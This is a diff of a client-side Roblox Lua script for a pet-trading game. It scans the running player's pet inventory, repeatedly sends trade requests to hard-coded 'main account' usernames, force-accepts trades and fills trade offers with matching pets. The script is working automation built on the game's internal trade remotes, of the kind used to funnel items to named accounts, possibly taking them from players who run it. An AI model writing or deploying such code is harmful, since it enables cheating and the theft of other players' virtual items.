@@ -1,8 +1,16 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
+-- Remotes and Functions
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
+
+-- Load ClientData for inventory scanning[cite: 3]
+local successClientData, ClientData = pcall(function()
+	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
+end)
 
 local function sendTradeRequest(playerName)
 	local targetPlayer = Players:FindFirstChild(playerName)
@@ -38,9 +46,34 @@ local function acceptTradeForAll()
 	end
 end
 
+local function getMultipleUniqueIdsByName(itemName, limit)
+	if not successClientData or not ClientData then
+		return {}
+	end
+
+	local dataStore = ClientData.get_data()
+	local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
+	
+	if not playerData or not playerData.inventory or not playerData.inventory.pets then
+		return {}
+	end
+
+	local uniqueIds = {}
+	for uniqueId, itemData in pairs(playerData.inventory.pets) do
+		if itemData and itemData.kind == itemName then
+			table.insert(uniqueIds, uniqueId)
+			if #uniqueIds >= limit then
+				break
+			end
+		end
+	end
+	return uniqueIds
+end
+
+-- Main automation loop combining sending, accepting, and 18-slot item adding
 task.spawn(function()
 	while true do
-		-- Only loop if names are provided and not empty
+		-- Send trades to listed accounts
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
 			for _, playerName in ipairs(MainAccUsername) do
 				if Players:FindFirstChild(playerName) then
@@ -49,10 +82,19 @@ task.spawn(function()
 			end
 		end
 
+		-- Accept trades if enabled
 		if ForceReceiver then
 			acceptTradeForAll()
 		end
 
-		task.wait(5)
+		-- Add items up to the 18 trade slot limit
+		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, MAX_ITEMS_TO_ADD)
+		for _, uniqueId in ipairs(uniqueIds) do
+			pcall(function()
+				addItemRemote:FireServer(uniqueId)
+			end)
+		end
+
+		task.wait(1)
 	end
 end)
